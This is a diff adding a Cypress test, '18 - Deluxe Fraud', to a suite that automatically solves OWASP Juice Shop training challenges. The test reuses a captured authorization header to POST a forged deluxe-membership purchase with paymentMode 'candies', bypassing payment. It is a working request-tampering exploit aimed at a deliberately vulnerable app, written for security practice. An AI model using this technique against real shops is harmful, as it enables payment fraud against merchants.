@@ -274,5 +274,25 @@ describe('OWASP JuiceShop Achivments unlocking Automation', () => {
       orders.placeOrder();
       cy.checkIsAchivSolvedXHR("Payback Time");
     });
+
+    it('18 - Deluxe Fraud', () => {
+      registrationPage.register();
+      loginPage.login();
+      products.addToBasket('Apple Juice');
+      cy.wait('@postBasketItems').then((postBasket) => {
+        cy.request({
+          method: 'POST',
+          url: `/rest/deluxe-membership`,
+          headers: {
+            'authorization': postBasket.request.headers.authorization
+          },
+          body: {
+            paymentMode: 'candies'
+          }
+        });
+      });
+      cy.checkIsAchivSolvedXHR("Deluxe Fraud");
+    });
+
   });
 });
